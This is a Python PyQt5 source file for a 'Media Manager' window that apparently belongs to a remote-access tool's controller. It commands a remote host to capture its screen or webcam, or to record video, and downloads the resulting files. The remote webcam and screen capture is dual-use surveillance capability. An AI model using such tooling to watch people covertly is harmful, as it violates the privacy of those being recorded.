import time
import struct
import socket
from PyQt5.QtWidgets import *
from PyQt5.QtCore import Qt
from client.core.base import RemoteBase
from client.core.network import recv_all, open_file

class MediaManager(RemoteBase, QMainWindow):
    def __init__(self, ip, pwd, controller=None):
        super().__init__(ip, pwd, controller)
        self.setWindowTitle(f"Media Manager - {ip}"); self.setFixedSize(300, 250)
        wid = QWidget(); self.setCentralWidget(wid); layout = QVBoxLayout(wid)
        b1 = QPushButton("CAPTURE SCREEN"); b1.clicked.connect(lambda: self.capture("SCREEN"))
        b2 = QPushButton("CAPTURE WEBCAM"); b2.clicked.connect(lambda: self.capture("WEBCAM"))
        self.rec_btn = QPushButton("START RECORDING"); self.rec_btn.clicked.connect(self.toggle_record)
        self.is_recording = False
        for b in [b1, b2, self.rec_btn]: b.setFixedHeight(40); layout.addWidget(b)

    def capture(self, mode):
        if self.send_safe_cmd({"type": "SCREENSHOT", "mode": mode}):
            h = recv_all(self.cmd_s, 4)
            if not h: return
            sz = struct.unpack("!I", h)[0]
            if sz > 0:
                path, _ = QFileDialog.getSaveFileName(self, f"Save {mode}", f"{mode.lower()}_{int(time.time())}.jpg", "*.jpg")
                if path:
                    progress = QProgressDialog(f"Downloading {mode}...", "Cancel", 0, 100, self)
                    progress.setWindowModality(Qt.ApplicationModal); progress.show()
                    old_timeout = self.cmd_s.gettimeout(); self.cmd_s.settimeout(0.1)
                    try:
                        with open(path, "wb") as f:
                            rem = sz
                            while rem > 0:
                                if progress.wasCanceled(): break
                                try:
                                    chunk = self.cmd_s.recv(min(rem, 131072))
                                    if not chunk: break
                                    f.write(chunk); rem -= len(chunk); progress.setValue(int((sz - rem) * 100 / sz))
                                except: pass
                                QApplication.processEvents()
                        if not progress.wasCanceled(): 
                            progress.close()
                            if QMessageBox.question(self, "Success", f"{mode} saved. Open it now?", QMessageBox.Yes | QMessageBox.No) == QMessageBox.Yes:
                                open_file(path)
                    finally: self.cmd_s.settimeout(old_timeout); progress.close()
            else: QMessageBox.warning(self, "Error", "Failed to capture. Check if webcam is available.")

    def toggle_record(self):
        if not self.is_recording:
            if self.send_safe_cmd({"type": "REC_START"}): self.is_recording = True; self.rec_btn.setText("STOP & DOWNLOAD")
        else:
            self.send_safe_cmd({"type": "REC_STOP"})
            progress = QProgressDialog("Server is finalizing video file...", "Cancel", 0, 0, self)
            progress.setWindowTitle("Processing"); progress.setWindowModality(Qt.ApplicationModal); progress.setRange(0, 0); progress.show(); QApplication.processEvents()
            old_timeout = self.cmd_s.gettimeout(); self.cmd_s.settimeout(0.1); h = b""
            try:
                while len(h) < 8:
                    if progress.wasCanceled(): break
                    try:
                        chunk = self.cmd_s.recv(8 - len(h))
                        if not chunk: break
                        h += chunk
                    except: pass
                    QApplication.processEvents()
            finally: self.cmd_s.settimeout(old_timeout)
            if progress.wasCanceled() or len(h) < 8: progress.close(); self.is_recording = False; self.rec_btn.setText("START RECORDING"); return
            
            sz = struct.unpack("!Q", h)[0]
            progress.close() 

            if sz > 0:
                path, _ = QFileDialog.getSaveFileName(self, "Save Video", f"record_{int(time.time())}.mp4", "*.mp4")
                if path:
                    dl_progress = QProgressDialog("Downloading Video Record...", "Cancel", 0, 100, self)
                    dl_progress.setWindowModality(Qt.ApplicationModal); dl_progress.show(); self.cmd_s.settimeout(0.1)
                    try:
                        with open(path, "wb") as f:
                            rem = sz
                            while rem > 0:
                                if dl_progress.wasCanceled(): break
                                try:
                                    chunk = self.cmd_s.recv(min(rem, 131072))
                                    if not chunk: break
                                    f.write(chunk); rem -= len(chunk); dl_progress.setValue(int((sz - rem) * 100 / sz))
                                except: pass
                                QApplication.processEvents()
                        if not dl_progress.wasCanceled(): 
                            dl_progress.close()
                            if QMessageBox.question(self, "Success", "Video downloaded. Open it now?", QMessageBox.Yes | QMessageBox.No) == QMessageBox.Yes:
                                open_file(path)
                    finally: self.cmd_s.settimeout(old_timeout); dl_progress.close()
            else: QMessageBox.warning(self, "Info", "No video data recorded or file is empty.")
            self.is_recording = False; self.rec_btn.setText("START RECORDING")
